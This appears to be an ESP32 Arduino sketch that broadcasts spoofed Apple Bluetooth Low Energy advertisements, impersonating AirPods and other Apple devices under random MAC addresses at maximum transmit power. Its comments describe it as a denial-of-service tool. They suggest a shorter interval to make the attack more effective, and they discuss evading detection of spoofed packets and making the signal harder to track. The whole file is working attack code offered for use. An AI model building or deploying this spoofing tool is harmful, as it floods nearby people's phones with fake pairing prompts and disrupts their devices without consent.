// This example takes heavy inpsiration from the ESP32 example by ronaldstoner
// Based on the previous work of chipik / _hexway / ECTO-1A & SAY-10
// See the README for more info
#include <Arduino.h>

#include <BLEDevice.h>
#include <BLEUtils.h>
#include <BLEServer.h>
#include <esp_arduino_version.h>

#include "devices.hpp"

// Bluetooth maximum transmit power
#if defined(CONFIG_IDF_TARGET_ESP32C3) || defined(CONFIG_IDF_TARGET_ESP32C2) || defined(CONFIG_IDF_TARGET_ESP32S3)
#define MAX_TX_POWER ESP_PWR_LVL_P21  // ESP32C3 ESP32C2 ESP32S3
#elif defined(CONFIG_IDF_TARGET_ESP32H2) || defined(CONFIG_IDF_TARGET_ESP32C6)
#define MAX_TX_POWER ESP_PWR_LVL_P20  // ESP32H2 ESP32C6
#else
#define MAX_TX_POWER ESP_PWR_LVL_P9   // Default
#endif

BLEAdvertising *pAdvertising;  // global variable
uint32_t delayMilliseconds = 500;

// Boot button control - Different GPIO for different ESP32 variants
#if defined(CONFIG_IDF_TARGET_ESP32C3) || defined(CONFIG_IDF_TARGET_ESP32C2) || defined(CONFIG_IDF_TARGET_ESP32S3) || defined(CONFIG_IDF_TARGET_ESP32C6) || defined(CONFIG_IDF_TARGET_ESP32H2)
#define BOOT_BUTTON_PIN 9  // GPIO9 for ESP32-C3, C2, S3, C6, H2
#else
#define BOOT_BUTTON_PIN 0  // GPIO0 for original ESP32
#endif

bool broadcastEnabled = true;  // Start with broadcasting enabled
unsigned long lastButtonPress = 0;
const unsigned long debounceDelay = 200;  // 200ms debounce

void setup() {
  Serial.begin(115200);
  Serial.println("Starting ESP32 BLE");

  // This is specific to the AirM2M ESP32 board
  // https://wiki.luatos.com/chips/esp32c3/board.html
  pinMode(12, OUTPUT);
  pinMode(13, OUTPUT);

  // Setup boot button with internal pull-up
  pinMode(BOOT_BUTTON_PIN, INPUT_PULLUP);
  Serial.print("Boot button configured on GPIO");//定義boot按鍵為GPIO0，並啟用內部上拉電阻
  Serial.println(BOOT_BUTTON_PIN);
  Serial.println("Press BOOT button to toggle broadcasting on/off");//提示用戶按下BOOT按鍵以切換廣播的開啟和關閉

  BLEDevice::init("AirPods 69");

  // Increase the BLE Power to 21dBm (MAX)
  // https://docs.espressif.com/projects/esp-idf/en/stable/esp32c3/api-reference/bluetooth/controller_vhci.html
  esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_ADV, MAX_TX_POWER);

  // Create the BLE Server
  BLEServer *pServer = BLEDevice::createServer();
  pAdvertising = pServer->getAdvertising();

  // seems we need to init it with an address in setup() step.
#if defined(CONFIG_NIMBLE_ENABLED)
  // NimBLE: use a random static address, randomized per advertisement in loop()
  BLEDevice::setOwnAddrType(BLE_OWN_ADDR_RANDOM);
#else
  esp_bd_addr_t null_addr = {0xFE, 0xED, 0xC0, 0xFF, 0xEE, 0x69};
  pAdvertising->setDeviceAddress(null_addr, BLE_ADDR_TYPE_RANDOM);
#endif
}

void loop() {
  // Check boot button state (active LOW)
  if (digitalRead(BOOT_BUTTON_PIN) == LOW) {
    unsigned long currentTime = millis();
    if (currentTime - lastButtonPress > debounceDelay) {
      broadcastEnabled = !broadcastEnabled;
      lastButtonPress = currentTime;

      if (broadcastEnabled) {
        Serial.println("Broadcasting ENABLED");
        digitalWrite(12, HIGH);
        digitalWrite(13, HIGH);
      } else {
        Serial.println("Broadcasting DISABLED");
        digitalWrite(12, LOW);
        digitalWrite(13, LOW);
      }

      // Wait for button release
      while (digitalRead(BOOT_BUTTON_PIN) == LOW) {
        delay(10);
      }
    }
  }

  // Skip broadcasting if disabled
  if (!broadcastEnabled) {
    delay(100);
    return;
  }

  // Turn lights on during "busy" part
  digitalWrite(12, HIGH);
  digitalWrite(13, HIGH);

  // First generate fake random MAC
  esp_bd_addr_t dummy_addr = {0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
  for (int i = 0; i < 6; i++){
    dummy_addr[i] = random(256);
  }

  // The address is little-endian, so index 5 is the most significant byte.
  // BLE marks the address type in the two most-significant bits. NimBLE rejects
  // the address (rc=BLE_HS_EINVAL=3) unless those bits are 11 (static random) or
  // 00 (non-resolvable private). Force 11 so every advertisement is accepted.
  dummy_addr[5] |= 0xC0;

  BLEAdvertisementData oAdvertisementData = BLEAdvertisementData();

  // Randomly pick data from one of the devices
  // First decide short or long
  // 0 = long (headphones), 1 = short (misc stuff like Apple TV)
  int device_choice = random(2);
  if (device_choice == 0){
    int index = random(22);
    #ifdef ESP_ARDUINO_VERSION_MAJOR
      #if ESP_ARDUINO_VERSION >= ESP_ARDUINO_VERSION_VAL(3, 0, 0)
          oAdvertisementData.addData(String((char*)DEVICES[index], 31));
      #else
          oAdvertisementData.addData(std::string((char*)DEVICES[index], 31));
      #endif
    #endif
  } else {
    int index = random(13);
    #ifdef ESP_ARDUINO_VERSION_MAJOR
      #if ESP_ARDUINO_VERSION >= ESP_ARDUINO_VERSION_VAL(3, 0, 0)
          oAdvertisementData.addData(String((char*)SHORT_DEVICES[index], 23));
      #else
          oAdvertisementData.addData(std::string((char*)SHORT_DEVICES[index], 23));
      #endif
    #endif
  }

/*  Page 191 of Apple's "Accessory Design Guidelines for Apple Devices (Release R20)" recommends to use only one of
      the three advertising PDU types when you want to connect to Apple devices.
          // 0 = ADV_TYPE_IND, 
          // 1 = ADV_TYPE_SCAN_IND
          // 2 = ADV_TYPE_NONCONN_IND
      
      Randomly using any of these PDU types may increase detectability of spoofed packets. 

      What we know for sure:
      - AirPods Gen 2: this advertises ADV_TYPE_SCAN_IND packets when the lid is opened and ADV_TYPE_NONCONN_IND when in pairing mode (when the rear case btton is held).
                        Consider using only these PDU types if you want to target Airpods Gen 2 specifically.
  */
  
  int adv_type_choice = random(3);
#if defined(CONFIG_NIMBLE_ENABLED)
  // NimBLE: map the three Bluedroid PDU types onto connectable/non-connectable modes
  // (scannable-undirected is approximated by undirected-connectable here)
  if (adv_type_choice == 0){
    pAdvertising->setAdvertisementType(BLE_GAP_CONN_MODE_UND);   // ADV_TYPE_IND
  } else if (adv_type_choice == 1){
    pAdvertising->setAdvertisementType(BLE_GAP_CONN_MODE_UND);   // ADV_TYPE_SCAN_IND
  } else {
    pAdvertising->setAdvertisementType(BLE_GAP_CONN_MODE_NON);   // ADV_TYPE_NONCONN_IND
  }
#else
  if (adv_type_choice == 0){
    pAdvertising->setAdvertisementType(ADV_TYPE_IND);
  } else if (adv_type_choice == 1){
    pAdvertising->setAdvertisementType(ADV_TYPE_SCAN_IND);
  } else {
    pAdvertising->setAdvertisementType(ADV_TYPE_NONCONN_IND);
  }
#endif

  // Set the device address, advertisement data
#if defined(CONFIG_NIMBLE_ENABLED)
  BLEDevice::setOwnAddr(dummy_addr);
#else
  pAdvertising->setDeviceAddress(dummy_addr, BLE_ADDR_TYPE_RANDOM);
#endif
  pAdvertising->setAdvertisementData(oAdvertisementData);
  
  // Set advertising interval
  /*  According to Apple' Technical Q&A QA1931 (https://developer.apple.com/library/archive/qa/qa1931/_index.html), Apple recommends
      an advertising interval of 20ms to developers who want to maximize the probability of their BLE accessories to be discovered by iOS.
      
      These lines of code fixes the interval to 20ms. Enabling these MIGHT increase the effectiveness of the DoS. Note this has not undergone thorough testing.
  */

  //pAdvertising->setMinInterval(0x20);
  //pAdvertising->setMaxInterval(0x20);
  //pAdvertising->setMinPreferred(0x20);
  //pAdvertising->setMaxPreferred(0x20);

  // Start advertising
  Serial.println("Sending Advertisement...");
  pAdvertising->start();

  // Turn lights off while "sleeping"
  digitalWrite(12, LOW);
  digitalWrite(13, LOW);
  delay(delayMilliseconds); // delay for delayMilliseconds ms
  pAdvertising->stop();

  // Keep BLE at maximum power (100%)
  esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_ADV, MAX_TX_POWER);

  // Random signal strength increases the difficulty of tracking the signal (DISABLED)
  // int rand_val = random(100);  // Generate a random number between 0 and 99
  // if (rand_val < 70) {  // 70% probability
  //     esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_ADV, MAX_TX_POWER);
  // } else if (rand_val < 85) {  // 15% probability
  //     esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_ADV, (esp_power_level_t)(MAX_TX_POWER - 1));
  // } else if (rand_val < 95) {  // 10% probability
  //     esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_ADV, (esp_power_level_t)(MAX_TX_POWER - 2));
  // } else if (rand_val < 99) {  // 4% probability
  //     esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_ADV, (esp_power_level_t)(MAX_TX_POWER - 3));
  // } else {  // 1% probability
  //     esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_ADV, (esp_power_level_t)(MAX_TX_POWER - 4));
  // }
}
